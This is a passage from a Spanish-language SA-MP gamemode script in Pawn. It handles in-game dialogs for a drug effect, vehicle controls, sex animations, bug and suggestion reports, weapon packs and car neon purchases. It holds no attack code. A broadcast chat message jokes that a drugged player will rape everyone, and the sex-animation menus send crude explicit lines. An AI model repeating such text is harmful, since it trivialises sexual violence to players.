				format(Byte,sizeof(Byte),"{FF0000}[DROGAS]:{0080FF} %s{FFFFFF} Esta drogado y los violara a todos.",Nombre);
				SendClientMessageToAll(Color,Byte);
				GameTextForPlayer(playerid, "~w~Modo Metanfetamina~n~~r~Activado", 3000, 3);
				SetTimerEx("TerminarEfectoDeLaDroga", 480000, 0,"e",playerid);
				SetTimerEx("ComenzarEfectoDeDroga", 500, 0,"e",playerid);
				SetPlayerWeather(playerid, -1);
				GivePlayerMoney(playerid, -10000);
				SetPlayerDrunkLevel(playerid, 50000);
				ApplyAnimation(playerid,"ped","Smoke_in_car",4.1,1,1,1,1,1);
     		}
     	}
    }
	if(dialogid == DIALOGO_CONTROL)
		{
			if(response)
			{
			    new veh = GetPlayerVehicleID(playerid);
				new engine,lights2,alarm,doors,bonnet,boot,objective;
				switch(listitem)
			    {
			        case 0:
			        {
		      			if(Control[playerid][0] == 0)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
							Control[playerid][0] = 1;
						}
						else if(Control[playerid][0] == 1)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
							Control[playerid][0] = 0;
						}
					}

					case 1:
					{
						if(Control[playerid][1] == 0)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,lights2,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
							Control[playerid][1] = 1;
						}
						else if(Control[playerid][1] == 1)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,lights2,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
							Control[playerid][1] = 0;
						}
					}

					case 2:
					{
						if(Control[playerid][2] == 0)
			 			{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
							Control[playerid][2] = 1;
						}
						else if(Control[playerid][2] == 1)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
							Control[playerid][2] = 0;
						}
					}

					case 3:
					{
						if(Control[playerid][3] == 0)
			 			{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,VEHICLE_PARAMS_ON,lights2,alarm,doors,bonnet,boot,objective);
							Control[playerid][3] = 1;
						}
						else if(Control[playerid][3] == 1)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,VEHICLE_PARAMS_OFF,lights2,alarm,doors,bonnet,boot,objective);
							Control[playerid][3] = 0;
						}
					}

					case 4:
					{
						if(Control[playerid][4] == 0)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,lights2,VEHICLE_PARAMS_ON,doors,bonnet,boot,objective);
							Control[playerid][4] = 1;
						}
						else if(Control[playerid][4] == 1)
						{
							GetVehicleParamsEx(veh,engine,lights2,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(veh,engine,lights2,VEHICLE_PARAMS_OFF,doors,bonnet,boot,objective);
							Control[playerid][4] = 0;
						}
					}
				}
			}
		}
	if(dialogid == AnimSexo)
    {
        if(response)
        {
    		switch(listitem)
        	{
                    case 0:
                    {
                    ApplyAnimation(playerid,"SNM","SPANKING_IDLEW",4.0, 0, 1, 1, 1, 1, 1);
                    }
                    case 1:
                    {
                    ApplyAnimation(playerid, "SNM","SPANKING_IDLEP", 4.0, 1, 1, 1, 1, 1, 1);
                    }
                    case 2:
					{
					ApplyAnimation(playerid, "SNM","SPANKINGW", 4.0, 1, 1, 1, 1, 1, 1);
					}
					case 3:
					{
					ApplyAnimation(playerid, "SNM","SPANKINGP", 4.0, 1, 1, 1, 1, 1, 1);
					}
					case 4:
					{
					ApplyAnimation(playerid, "SNM","SPANKEDW", 4.0, 1, 1, 1, 1, 1, 1);
					}
					case 5:
					{
					ApplyAnimation(playerid, "SNM","SPANKEDP", 4.0, 1, 1, 1, 1, 1, 1);
					}
					case 6:
					{
					ApplyAnimation(playerid, "SNM","SPANKING_ENDW", 4.0, 1, 1, 1, 1, 1, 1);
					}
					case 7:
					{
					ApplyAnimation(playerid, "SNM","SPANKING_ENDP", 4.0, 1, 1, 1, 1, 1, 1);
					}
					case 8:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_START_P",4.1,0,1,1,1,1,1);
					}
					case 9:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_START_W",4.1,0,1,1,1,1,1);
					}
					case 10:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_P",4.1,0,1,1,1,1,1);
					}
					case 11:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_W",4.1,0,1,1,1,1,1);
					}
					case 12:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_END_P",4.1,0,1,1,1,1,1);
					}
					case 13:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_END_W",4.1,0,1,1,1,1,1);
					}
					case 14:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_START_P",4.1,0,1,1,1,1,1);
					}
					case 15:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_START_W",4.1,0,1,1,1,1,1);
					}
					case 16:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_LOOP_P",4.1,0,1,1,1,1,1);
					}
					case 17:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_LOOP_W",4.1,0,1,1,1,1,1);
					}
                    case 18:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_END_P",4.1,0,1,1,1,1,1);
					}
					case 19:
					{
					ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_END_W",4.1,0,1,1,1,1,1);
					}
               }
            }
        }
	//DIALOGO SEXO
    if(dialogid == 1540)
	{
		if(response)
		{
			if(listitem == 0)
			{
                ApplyAnimation(playerid,"SNM","SPANKING_IDLEW",4.0, 0, 1, 1, 1, 1, 1);
                SendClientMessage(playerid, 0xFF0000FF, "Te Pusiste En Cuatro :$ Fuck Me");
			}
			if(listitem == 1)
			{
				ApplyAnimation(playerid, "SNM","SPANKINGW", 4.0, 1, 1, 1, 1, 1, 1);
                SendClientMessage(playerid, 0x0000FF15, "Te Pusiste En Cuatro :$ Fuck Me");
			}
			if(listitem == 2)
			{
				ApplyAnimation(playerid, "SNM","SPANKEDP", 4.0, 1, 1, 1, 1, 1, 1);
                SendClientMessage(playerid, 0x9BA2ABE4, "Te Pusiste En Cuatro :$ Fuck Me");
			}
			if(listitem == 3)
			{
                ApplyAnimation(playerid, "SNM","SPANKINGP", 4.0, 1, 1, 1, 1, 1, 1);
                SendClientMessage(playerid, 0x00FF0000, "Buena Nalgada");
			}
			if(listitem == 4)
			{
				ApplyAnimation(playerid, "SNM","SPANKEDW", 4.0, 1, 1, 1, 1, 1, 1);
                SendClientMessage(playerid, 0x00000000, "Buena Nalgada");
			}
			if(listitem == 5)
			{
				ApplyAnimation(playerid, "SNM","SPANKING_ENDP", 4.0, 1, 1, 1, 1, 1, 1);
                SendClientMessage(playerid, 0xFFFFFFFF, "Buena Nalgada");
			}
			if(listitem == 6)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_START_P",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0xFF9C0000, "O Si Sigue Asi Mamamela Mas xD");
			}
			if(listitem == 7)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_START_P",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0xFF9CFF00, "O Si Sigue Asi Mamamela Mas xD");
			}
			if(listitem == 8)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_P",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0xC400FFF8, "O Si Sigue Asi Mamamela Mas xD");
			}
			if(listitem == 9)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_END_P",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "O Si Sigue Asi Mamamela Mas xD");
			}
			if(listitem == 10)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_START_P",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "O Si Sigue Asi Mamamela Mas xD");
			}
			if(listitem == 11)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_END_P",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "O Si Sigue Asi Mamamela Mas xD");
			}
			if(listitem == 12)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_START_W",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "Ohhh Que Rico!!!");
			}
			if(listitem == 13)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_W",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "Ohhh Que Rico!!!");
			}
			if(listitem == 14)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_END_W",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "Ohhh Que Rico!!!");
			}
			if(listitem == 15)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_END_W",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "Ohhh Que Rico!!!");
			}
			if(listitem == 16)
			{
				ApplyAnimation(playerid,"BLOWJOBZ","BJ_STAND_END_W",4.1,0,1,1,1,1, 1);
                SendClientMessage(playerid, 0x00DFFFF8, "Ohhh Que Rico!!!");
			}
        }
    }
	if(dialogid == DIALOG_BUG)
	{
	    switch(response)
	    {
	        case 1:
	        {
	        	new NombreJ[MAX_PLAYER_NAME+15];
	        	format(NombreJ, sizeof(NombreJ), "[BUG %d] %s", CantidadBug[playerid] , ObtenerNombre(playerid));
	        	dini_Set("/ladmin/Bugs.txt", NombreJ, inputtext);
	        	CantidadBug[playerid]++;
	        	SendClientMessage(playerid, -1, "Gracias por reportar este bug, pronto sera atendido por un administrador");
	        	print("[BUG] ???Nuevo Aviso De Bug Guardado!!!");
	        }
	    }
	}
	if(dialogid == DIALOG_SUGERENCIA)
	{
	    switch(response)
	    {
	        case 1:
	        {
	        	new NombreJ[MAX_PLAYER_NAME+15];
	        	format(NombreJ, sizeof(NombreJ), "[SUGERENCIA %d] %s", CantidadSugerencia[playerid] ,ObtenerNombre(playerid));
	        	dini_Set("/ladmin/Sugerencias.txt", NombreJ, inputtext);
	        	CantidadSugerencia[playerid]++;
	        	SendClientMessage(playerid, -1, "Gracias por dar una sugerencia, pronto sera atendido por un administrador");
	        	print("[SUGERENCIA] ???Nuevo Aviso De Sugerencia Guardado!!!");
	        }
	    }
	}
	if(dialogid == packs)
	{
		if(response)
		{
			if(listitem == 0) //(Pack 1) |Recortada|Uzi|M4|Sniper| $3000
			{
				GivePlayerWeapon(playerid,26,999);
				GivePlayerWeapon(playerid,28,999);
				GivePlayerWeapon(playerid,31,999);
				GivePlayerWeapon(playerid,34,999);
				SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has obtenido Pack 1.");	
			}
			if(listitem == 1) //(Pack 2) |Recortada|Tec9|Ak47|Sniper| $6000
			{
				GivePlayerWeapon(playerid,26,999);
				GivePlayerWeapon(playerid,32,999);
				GivePlayerWeapon(playerid,30,999);
				GivePlayerWeapon(playerid,34,999);
				SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has obtenido Pack 2.");
			}
			
			if(listitem == 2) //(Pack 3) |M4|Sniper|Colt45|Mp5| $8000
			{
				GivePlayerWeapon(playerid,31,999);
				GivePlayerWeapon(playerid,34,999);
				GivePlayerWeapon(playerid,22,999);
				GivePlayerWeapon(playerid,29,999);
				SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has obtenido Pack 3.");	
			}
			if(listitem == 3) //(Pack 4) |Combat Shotgun|Tec9|M4|Spray| $ 10000
			{
				GivePlayerWeapon(playerid,27,999);
				GivePlayerWeapon(playerid,32,999);
				GivePlayerWeapon(playerid,31,999);
				GivePlayerWeapon(playerid,41,999);
				SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has obtenido Pack 4.");	
			}
			if(listitem == 4) //(Pack 5) |Colt45|Recortada|Mp5| $12000
			{
				GivePlayerWeapon(playerid,22,999);
				GivePlayerWeapon(playerid,26,999);
				GivePlayerWeapon(playerid,29,999);
				SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has obtenido Pack 5.");
			}
			if(listitem == 5) //(Pack 6) |Colt45|Tecs|M4|Spray|Sniper| $14000
			{

				GivePlayerWeapon(playerid,22,999);
				GivePlayerWeapon(playerid,29,999);
				GivePlayerWeapon(playerid,32,999);
				GivePlayerWeapon(playerid,41,999);
				GivePlayerWeapon(playerid,34,999);
				SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has obtenido Pack 6.");
			}
			SavePlayer(playerid);
		}
		return 1;
	}	
	if(dialogid == neondialog)
        {
            if(response)
            {
                if(listitem == 0)
                {
					if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
                	SetPVarInt(playerid, "Status", 1);
                	SetPVarInt(playerid, "neon", CreateObject(18648,0,0,0,0,0,0));
                	SetPVarInt(playerid, "neon1", CreateObject(18648,0,0,0,0,0,0));
					GivePlayerMoney(playerid,-1000);
                	AttachObjectToVehicle(GetPVarInt(playerid, "neon"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                	AttachObjectToVehicle(GetPVarInt(playerid, "neon1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                	SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado.");
                }
                    if(listitem == 1)
                {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
                	SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon2", CreateObject(18647,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon3", CreateObject(18647,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon2"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon3"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado.");

            	}
                    if(listitem == 2)
                {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
            		SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon4", CreateObject(18649,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon5", CreateObject(18649,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon4"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon5"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado.");
                }
                if(listitem == 3)
                {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
                    SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon6", CreateObject(18652,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon7", CreateObject(18652,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon6"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon7"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado.");
            	}
                if(listitem == 4)
                {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
                    SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon8", CreateObject(18651,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon9", CreateObject(18651,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon8"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon9"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado.");
           		 }
                        if(listitem == 5)
                        {
            		if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
            		SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon10", CreateObject(18650,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon11", CreateObject(18650,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon10"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon11"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado.");

            }
            if(listitem == 6)
                        {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
            		SetPVarInt(playerid, "Status", 1);
                	SetPVarInt(playerid, "neon12", CreateObject(18648,0,0,0,0,0,0));
                	SetPVarInt(playerid, "neon13", CreateObject(18648,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon14", CreateObject(18649,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon15", CreateObject(18649,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon12"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon13"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon14"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon15"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado");

            }
             if(listitem == 7)
                        {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
             		SetPVarInt(playerid, "Status", 1);
                	SetPVarInt(playerid, "neon16", CreateObject(18648,0,0,0,0,0,0));
                	SetPVarInt(playerid, "neon17", CreateObject(18648,0,0,0,0,0,0));
                	SetPVarInt(playerid, "neon18", CreateObject(18652,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon19", CreateObject(18652,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon16"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon17"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon18"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon19"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado");

            }
            if(listitem == 8)
                        {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
            		SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon20", CreateObject(18647,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon21", CreateObject(18647,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon22", CreateObject(18652,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon23", CreateObject(18652,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon20"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon21"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon22"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon23"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado");

            }
             if(listitem == 9)
                        {
             		if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
             		SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon24", CreateObject(18647,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon25", CreateObject(18647,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon26", CreateObject(18650,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon27", CreateObject(18650,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon24"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon25"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon26"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon27"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado");

            }
             if(listitem == 10)
                        {
                    if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
             		SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon28", CreateObject(18649,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon29", CreateObject(18649,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon30", CreateObject(18652,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon31", CreateObject(18652,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon28"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon29"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon30"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon31"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado");

            }
            if(listitem == 11)
                        {
            		if(GetPlayerMoney(playerid)<1000)return SendClientMessage(playerid,red,"[NEONES]: {FFFFFF}Necesitas $1000 para comprar neones");
              		SetPVarInt(playerid, "Status", 1);
                    SetPVarInt(playerid, "neon32", CreateObject(18652,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon33", CreateObject(18652,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon34", CreateObject(18650,0,0,0,0,0,0));
                    SetPVarInt(playerid, "neon35", CreateObject(18650,0,0,0,0,0,0));
                    GivePlayerMoney(playerid,-1000);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon32"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon33"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon34"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    AttachObjectToVehicle(GetPVarInt(playerid, "neon35"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
                    SendClientMessage(playerid, 0xFFFFFFAA, "Neon instalado");

            }
   if(listitem == 12){DestroyObject(GetPVarInt(playerid, "neon")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon1")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon2")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon3"));
            DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon4")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon5")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon6")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon7"));
                        DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon8")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon9")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon10")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon11"));
            DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon12")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon13")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon14")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon15"));
            DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon16")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon17")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon18")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon19"));
            DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon20")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon21")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon22")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon23"));
                        DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon24")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon25")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon26")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon27"));
            DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon28")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon29")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon30")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon31"));
            DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon32")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon33")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon34")); DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon35"));
                    }
                }
        }
	if(dialogid == lmenu)
	{
		if(response)
		{
